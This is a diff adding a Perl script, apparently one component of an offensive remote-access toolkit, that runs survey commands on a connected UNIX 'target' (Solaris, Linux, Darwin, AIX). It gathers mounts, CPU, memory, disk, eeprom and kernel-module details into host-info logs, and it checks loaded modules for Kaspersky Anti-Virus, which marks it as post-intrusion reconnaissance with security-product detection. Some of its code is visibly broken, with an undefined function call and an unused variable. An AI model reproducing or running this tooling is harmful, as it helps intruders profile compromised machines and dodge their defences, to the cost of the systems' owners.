@@ -1,0 +1,322 @@
+#!/usr/bin/env perl
+#
+# 20130416 - This portion of autonewdone implements all of the OS-specific commands
+# that need to be run when first connecting to a UNIX target.
+#
+$VER="3.0.0.7";
+$ext = $$ ;			# limits likelihood of concurrent autodone's colliding
+				# BUT: still possible.
+				# not too likely to happen.
+
+$| = 1;
+myinit() ;
+
+sub doosspecific() {
+  # Open the autodothis file here.
+  open(CMDOUT,">$statsfile");
+
+  doitwrite("cat /etc/coreadm.conf ; echo") unless !($solaristarget);
+    
+  unless ($solaristarget) {
+   logdoit("mount",
+           "cat /proc/mounts");
+  }
+  
+  if ($solaristarget) {
+    if ($host_hiddendir =~ /^\/platform\/.*/) {
+      unless ($host_hiddendir and $hiddendir_viastoic) {
+        mydo("autoorcheck","-i");
+        mydo("autopccheck","-i");
+      }
+    }
+    logdoit("iostat -E",
+            "vmstat",
+            "=procinfo",
+            "psrinfo -vp",
+            "isalist",
+           );
+    logdoit("echo :::isainfo -bv::: ; isainfo -bv",
+            "echo :::isainfo -kv::: ; isainfo -kv",
+            "echo :::isainfo -nv::: ; isainfo -nv",
+            "eeprom",
+           );
+    
+    chomp($psrinfofile = `ls -rt $optargetcommands/psrinfo_-v__* | tail -1`);
+    if (open(PSRINFOFILE,"< $psrinfofile")) { 
+      my ($cpu,$c,$vendorid,$speed,$fpproc,$gotcpu,$cputype) = () ;
+      my @cpu = () ;
+      while (chomp($line = <PSRINFOFILE>)) {
+        #dbg("in autonewdone osspecific, line=$line=");
+        if (($cputype,$gotcpu) = $line =~ /Status of (\S*)\s*processor (\S+)/) {
+          #dbg("in autonewdone osspecific, cputypr=$cputype= gotcpu=$gotcpu=");
+          if ($cpu) {
+            $cpu =~ s/[, ]*$// ;
+            push(@cpu,$cpu) ;
+          }
+          $cputype .= " " if length $cputype;
+          $cpu = "#$gotcpu $cputype";
+        }
+        $cpu .= "up since $1 " if ($line =~ /since (.*)\./) ;
+        $cpu .= "$1 " if ($line =~ /(sparc\S*) processor/i) ;
+        $cpu .= "$1 " if ($line =~ / (i.86) processor/i) ;
+        $cpu .= "$1 " if ($line =~ /operates at (\d+\s*(\S*Hz))/i) ;
+        $cpu .= "with $1 " if ($line =~ /and has an{0,1} (.* floating point processor)/i) ;
+        #dbg("in autonewdone osspecific, cpu=$cpu=");
+      }
+      push(@cpu,$cpu) if $cpu;
+      #dbg("in autonewdone osspecific, cpu=$cpu= cpuarray=@cpu=");
+      close(PSRINFOFILE);
+      if (my $num = @cpu) {
+        print HOSTINFO "Number of Processors: $num\n" if (@cpu);
+        foreach (@cpu) {
+          ($c) = /^\#(\d+\S*)/;
+          ($vendorid,$speed) = /(\S+)\s+([\.\d]+\s+\S*Hz)/ ;
+          ($fpproc) = /with\s+(.*\S+)\s*/ ;
+          print HOSTINFO "Processor: $cpu\n";
+          print HOSTINFO "CPU $c Speed: $speed\n" if (length($speed)) ;
+          print HOSTINFO "CPU $c VendorIdentifier: $vendorid\n" if (length($vendorid)) ;
+          print HOSTINFO "CPU $c FP processor: $fpproc\n" if (length($fpproc)) ;
+        }
+      }
+    }
+    else {
+      myalert("Can't open $statsfile! $!");
+    }
+    
+    #if ($solaristargetversion =~ /^2\.11/) {
+    #  my $pkginfo = doitwrite("pkg info kernel");
+      # TODO: Set a variable for this, the uname variable no longer useful for kernel level detection in 2.11+.
+    #} elsif ($solaristargetversion =~ /^2\.(8|9|10|11)/) {
+    #  logdoit("prtconf -pv");
+    #} else {
+    #  logdoit("prtconf -V");
+    #}
+            
+  } elsif ($darwintarget) {
+    my %diskutilsdone = ();
+    foreach my $line (readfile("ARRAY","$optargetcommands/mount*")) {
+      my ($subdisk,$disk) = $line =~ m,^\s*((/dev/disk\d+)\S+\d+),;
+      logdoit("diskutil info $subdisk") if ($subdisk and not $diskutilsdone{$subdisk}++);
+      logdoit("diskutil info $subdisk") if ($disk and not $diskutilsdone{$disk}++);
+    }
+  } elsif ($linuxtarget) {
+    logdoit("lspci -vvvv",
+            "lsusb",
+            "more /proc/iomem /proc/pci /proc/ioports /proc/scsi/scsi /proc/meminfo /proc/cpuinfo",
+            "more /proc/version",
+           );
+    
+    if (open(STATSFILE,"< $statsfile")) {
+      my ($memoryoutput,$swapoutput,
+          $totalmem,$freemem,$memwarned,$swapwarned,
+          $totalswap,$freeswap)=();
+      my $inmeminfo = 0;
+      while (chomp($line = <STATSFILE>)) {
+        if ($line !~ /^\/proc\/meminfo$/) {
+          next unless $inmeminfo;
+        }
+        else {
+          $inmeminfo++;
+        }
+
+        #dbg("in autonewdone osspecific meminfoscan, inmeminfo=$inmeminfo= line=$line=");        
+        $totalmem = $1 if ($line =~ /mem.*total.*:(.+)/i or
+                           $line =~ /total.*mem.*:(.+)/i);
+        $freemem = $1 if ($line =~ /mem.*free.*:(.+)/i or
+                          $line =~ /free.*mem.*:(.+)/i or
+                          $line =~ /mem.*avail.*:(.+)/i or
+                          $line =~ /avail.*mem.*:(.+)/i);
+        $totalswap = $1 if ($line =~ /swap.*total:(.+)/i or
+                            $line =~ /total.*swap:(.+)/i);
+        $freeswap = $1 if ($line =~ /swap.*free:(.+)/i or
+                           $line =~ /free.*swap:(.+)/i);
+        $totalmem =~ s/\s+//g;
+        $freemem =~ s/\s+//g;
+        $totalswap =~ s/\s+//g;
+        $freeswap =~ s/\s+//g;
+        if ($totalmem and $freemem and $totalswap and $freeswap) {
+          last;
+        }
+      }
+      dbg("in autonewdone osspecific meminfoscan, totalmem=$totalmem= freemem=$freemem totalswap=$totalswap= freeswap=$freeswap=");
+      if ($freemem and $totalmem) {
+        my ($usedpct,$usedstr) = freespace($freemem,$totalmem);
+        if ($usedpct >= 90 and !$memwarned) {
+          $memwarned++;
+          my $str = "Memory almost FULL! $freemem/$totalmem$usedstr\n";
+          mywarn($str);
+          $latewarnings .= $str;
+        }
+        $memoryoutput = "RAM available: $freemem/$totalmem$usedstr\n";
+      }
+      if ($freeswap and $totalswap) {
+        my ($usedpct,$usedstr) = freespace($freeswap,$totalswap);
+        if ($usedpct >= 90 and !$swapwarned) {
+          $swapwarned++;
+          my $str = "Swap almost FULL! $freeswap/$totalswap$usedstr\n";
+          mymywarn($str);
+          $latewarnings .= $str;
+        }
+        $swapoutput = "Swap available: $freeswap/$totalswap$usedstr\n";
+      }
+      print HOSTINFO $memoryoutput if ($memoryoutput);
+      print HOSTINFO $swapoutput if ($swapoutput);
+      
+      my ($cpu,$c,$id,$vendorid,$speed,$bmips) = ();
+      my @cpu = () ;
+      my $incpuinfo = 0, $linecount = 0;
+      while (chomp($line = <STATSFILE>)) {
+        if ($line !~ /^\/proc\/cpuinfo$/) {
+          next unless $incpuinfo;
+        }
+        else {
+          $incpuinfo++;
+        }
+        
+        if ($cpu and $linecount >= 5) {
+          my $num = @cpu;
+          #dbg("in autonewdone osspecific cpuinfoscan, cpu=$cpu= cpunum=$num=");
+          $cpu =~ s/[, ]*$// ;
+          push(@cpu,$cpu) ;
+          $cpu = "";
+          $linecount = 0;
+        }
+
+        $line =~ s/\s+:\s+/=/ ;
+        $line =~ s/^\s*//;
+        #dbg("in autonewdone osspecific cpuinfoscan, incpuinfo=$incpuinfo= line=$line=");
+        if ($line =~ /processor=(.+)/ or $line =~ /cpu=(.+)/) {
+          $cpu .= "#$1 ";
+          $linecount++;
+          next;
+        }
+        if ($line =~ /cpu MHz=(.+)/) {
+          $cpu .= "$1MHz ";
+          $linecount++;
+          next;
+        }
+        if ($line =~ /vendor_id=(.+)/) {
+          $cpu .= "$1 ";
+          $linecount++;
+          next;
+        }
+        if ($line =~ /model name=(.+)/) {
+          $cpu .= "$1 ";
+          $linecount++;
+          next;
+        }
+        if ($line =~ /bogomips=(.+)/i) {
+          $cpu .= "bogomips=$1 ";
+          $linecount++;
+          next;
+        }
+        if ($line =~ /prom(.*)=(.+)/i) {
+          $cpu .= "prom$1=$2 ";
+          $linecount++;
+          next;
+        }
+      }
+      close(STATSFILE);
+      if (my $num = @cpu) {
+        print HOSTINFO "Number of Processors: $num\n" if (@cpu);
+        foreach $cpu (@cpu) {
+          ($c,$id,$vendorid,$speed,$bmips) = $cpu =~
+            /^\#(\d+)\s+((\S+)\s+.*)\s+([\.\d]+)MHz\s+bogomips=([\.\d]+)/ ;
+          print HOSTINFO "Processor: $cpu\n";
+          print HOSTINFO "CPU $c Speed: $speed\n" if (length($speed)) ;
+          print HOSTINFO "CPU $c Identifier: $id\n" if (length($id)) ;
+          print HOSTINFO "CPU $c VendorIdentifier: $vendorid\n" if (length($vendorid)) ;
+          print HOSTINFO "CPU $c Bogomips: $bmips\n" if (length($bmips)) ;
+        }
+      }
+    }
+    else {
+      myalert("Can't open $statsfile! $!");
+    }
+    
+    chomp($dffile = `ls -rt $optargetcommands/df_-k__* | tail -1`);
+    if (open(DFFILE,"< $dffile")) {
+      my %hddone = ();
+      while (chomp($line = <DFFILE>)) {
+        if ($line =~ /^\s*(\/dev\/[a-z]+)\d+\s+/ and ! $hddone{$1}++ ) {
+          doit("hdparm -I $1\n");
+        }
+      }
+      close(DFFILE);
+    }
+    else {
+      myalert("Can't open $dffile! $!");
+    }
+    
+    logdoit("lsmod");
+    my %modulestrings = ("kav","Kaspersky Anti-Virus");
+    foreach my $modulekey (sort keys %modulestrings) {
+      if ($results =~ /$key/) {
+        # TODO: Add logic like pscheck here to popup with alerts
+      }
+    }
+           
+  } elsif ($freebsdtarget) {
+    #logdoit("df -k");
+
+  } elsif($darwintarget) {
+    logdoit("sw_vers",
+            "kldstat",
+            "sysctl -a ; echo"
+           );
+           
+  } elsif ($aixtarget) {
+    logdoit("prtconf");
+    logdoit("uname -M");
+  }
+  
+  close(CMDOUT);
+  return 1;
+}
+
+sub freespace {
+  local ($avail,$total) = (@_);
+  ($avail) = $avail =~ /(\d+)/;
+  ($total) = $total =~ /(\d+)/;
+  if ($total and $avail and $total > 0) {
+    my $availpct = int(0.50 + 100 * 10 * ($avail/$total)) / 10 ;
+    my $usedpct = int(0.50 + 10*(100 - $availpct))/10 ;
+    my $usedstr = " ($usedpct% used)";
+    return ($usedpct,$usedstr);
+  } else {
+    return ();
+  }
+}#freespace
+
+doosspecific ();
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs newdone.osspecific @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }
+    require $autoutils;
+    $prog = "-gs newdone.osspecific";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+
+  # Setting $autodone allows any mydo() called functions to know
+  # we are in this mode to populate $opdir/latewarnings*
+  $autodone=1;
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+}#myinit
